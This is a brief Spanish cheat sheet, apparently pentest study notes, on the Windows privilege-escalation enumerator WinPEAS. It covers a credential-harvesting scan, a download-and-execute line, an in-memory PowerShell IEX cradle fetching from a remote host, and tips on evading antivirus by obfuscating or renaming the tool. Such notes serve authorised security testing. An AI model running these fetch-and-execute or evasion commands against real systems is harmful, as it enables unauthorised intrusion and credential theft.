**Descripción**:  
WinPEAS es una herramienta utilizada para enumerar configuraciones inseguras en sistemas Windows que pueden permitir escalación de privilegios. Su objetivo es identificar posibles vulnerabilidades en permisos, credenciales, servicios y configuraciones del sistema.

**Funcionalidades clave**:
- **Enumeración de credenciales**: Busca contraseñas almacenadas en registros, archivos y procesos.
- **Detección de permisos inseguros**: Identifica archivos y servicios con permisos que permiten manipulación por parte de un usuario con bajos privilegios.
- **Revisión de configuraciones del sistema**: Detecta configuraciones mal implementadas en el Registro de Windows, UAC y tareas programadas.
- **Análisis de software instalado**: Enumera aplicaciones instaladas y verifica si hay versiones vulnerables.
- **Detección de exploits conocidos**: Busca parches de seguridad ausentes y configuraciones que puedan permitir la escalada de privilegios.

**Comandos básicos**:
- **Ejecutar WinPEAS con salida en colores**
```powershell
winPEAS.exe color
```

- **Ejecutar sin colores para evitar detección**
```powershell
winPEAS.exe nocolor
```

- **Ejecutar solo el escaneo de credenciales**
```powershell
winPEAS.exe quiet windowscreds
```

- **Ejecutar un escaneo detallado de privilegios y grupos**
```powershell
winPEAS.exe quiet userinfo
```


**Ejemplo de uso**:
- **Descargar y ejecutar WinPEAS desde un servidor HTTP**
```powershell
wget http://10.10.14.9/winPEAS.exe -OutFile C:\Users\Public\winPEAS.exe C:\Users\Public\winPEAS.exe color
```

- **Ejecutar en memoria para evitar detección**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.9/winPEAS.ps1')
```


**Consideraciones de seguridad**:
- **WinPEAS puede ser detectado por antivirus**, por lo que se recomienda renombrarlo o usar una versión ofuscada.
- **No todas las configuraciones inseguras permiten escalación**, pero pueden combinarse con otras técnicas.
- **Solo debe usarse en entornos donde se tenga permiso para auditar la seguridad del sistema.**
